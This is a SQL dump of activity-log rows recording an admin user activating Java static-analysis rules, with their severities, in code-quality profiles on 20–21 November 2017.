INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2579, '2017-11-20 12:17:07.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFRtbbGRdfPp-rF3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2580, '2017-11-20 12:17:07.711', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFR_bbGRdfPp-rF4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2581, '2017-11-20 12:17:07.733', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFSVbbGRdfPp-rF5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2582, '2017-11-20 12:17:07.76', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFSwbbGRdfPp-rF6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2583, '2017-11-20 12:17:07.788', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFTMbbGRdfPp-rF7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2584, '2017-11-20 12:17:07.813', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFTlbbGRdfPp-rF8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2585, '2017-11-20 12:17:07.861', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFUVbbGRdfPp-rF9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2586, '2017-11-20 12:17:07.887', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFUvbbGRdfPp-rF-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2587, '2017-11-20 12:17:07.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFVGbbGRdfPp-rF_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2588, '2017-11-20 12:17:07.937', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFVhbbGRdfPp-rGA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2589, '2017-11-20 12:17:07.964', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFV8bbGRdfPp-rGB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2590, '2017-11-20 12:17:07.983', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFWPbbGRdfPp-rGC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2591, '2017-11-20 12:17:08.007', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFWnbbGRdfPp-rGD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2592, '2017-11-20 12:17:08.032', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFXAbbGRdfPp-rGE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2593, '2017-11-20 12:17:08.048', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFXQbbGRdfPp-rGF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2594, '2017-11-20 12:17:08.08', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFXwbbGRdfPp-rGG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2595, '2017-11-20 12:17:08.107', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFYLbbGRdfPp-rGH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2596, '2017-11-20 12:17:08.132', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFYkbbGRdfPp-rGI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2597, '2017-11-20 12:17:08.157', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFY9bbGRdfPp-rGJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2598, '2017-11-20 12:17:08.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFZZbbGRdfPp-rGK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2599, '2017-11-20 12:17:08.213', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFZ1bbGRdfPp-rGL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2600, '2017-11-20 12:17:08.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFaObbGRdfPp-rGM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2601, '2017-11-20 12:17:08.261', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFalbbGRdfPp-rGN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2602, '2017-11-20 12:17:08.278', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFa2bbGRdfPp-rGO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2603, '2017-11-20 12:17:08.301', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFbNbbGRdfPp-rGP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2604, '2017-11-20 12:17:08.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFbnbbGRdfPp-rGQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2605, '2017-11-20 12:17:08.354', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFcCbbGRdfPp-rGR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2606, '2017-11-20 12:17:08.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFcbbbGRdfPp-rGS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2607, '2017-11-20 12:17:08.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFdabbGRdfPp-rGT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2608, '2017-11-20 12:17:08.476', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFd8bbGRdfPp-rGU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2609, '2017-11-20 12:17:08.519', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFenbbGRdfPp-rGV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2610, '2017-11-20 12:17:08.578', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFfibbGRdfPp-rGW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2611, '2017-11-20 12:17:08.619', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFgLbbGRdfPp-rGX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2612, '2017-11-20 12:17:08.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFgcbbGRdfPp-rGY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2613, '2017-11-20 12:17:08.651', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFgrbbGRdfPp-rGZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2614, '2017-11-20 12:17:08.675', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFhDbbGRdfPp-rGa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2615, '2017-11-20 12:17:08.691', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFhTbbGRdfPp-rGb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2616, '2017-11-20 12:17:08.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFhrbbGRdfPp-rGc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2617, '2017-11-20 12:17:08.747', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFiLbbGRdfPp-rGd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2618, '2017-11-20 12:17:08.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFizbbGRdfPp-rGe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2619, '2017-11-20 12:17:08.823', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFjXbbGRdfPp-rGf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2620, '2017-11-20 12:17:08.877', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFkNbbGRdfPp-rGg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2621, '2017-11-20 12:17:08.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFk3bbGRdfPp-rGh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2622, '2017-11-20 12:17:08.954', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFlabbGRdfPp-rGi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2623, '2017-11-20 12:17:08.992', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFmAbbGRdfPp-rGj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2624, '2017-11-20 12:17:09.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFnAbbGRdfPp-rGk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2625, '2017-11-20 12:17:09.09', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFnibbGRdfPp-rGl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2626, '2017-11-20 12:17:09.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFoLbbGRdfPp-rGm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2627, '2017-11-20 12:17:09.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFovbbGRdfPp-rGn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2628, '2017-11-20 12:17:09.205', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFpVbbGRdfPp-rGo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2629, '2017-11-20 12:17:09.247', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFp_bbGRdfPp-rGp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2630, '2017-11-20 12:17:09.283', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFqjbbGRdfPp-rGq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2631, '2017-11-20 12:17:09.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFrPbbGRdfPp-rGr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2632, '2017-11-20 12:17:09.388', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFsMbbGRdfPp-rGs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2633, '2017-11-20 12:17:09.462', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFtWbbGRdfPp-rGt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2634, '2017-11-20 12:17:09.6', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFvgbbGRdfPp-rGu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2635, '2017-11-20 12:17:09.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFxkbbGRdfPp-rGv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2636, '2017-11-20 12:17:09.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFyabbGRdfPp-rGw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2637, '2017-11-20 12:17:09.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXFy5bbGRdfPp-rGx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4115, '2017-11-21 04:09:54.366', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S106;ruleKey=squid:S106;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ--CVgt9BPyn_UZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2638, '2017-11-20 12:19:05.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiExbbGRdfPp-rGy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2639, '2017-11-20 12:19:05.676', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiFMbbGRdfPp-rGz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2640, '2017-11-20 12:19:05.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXiFgbbGRdfPp-rG0');
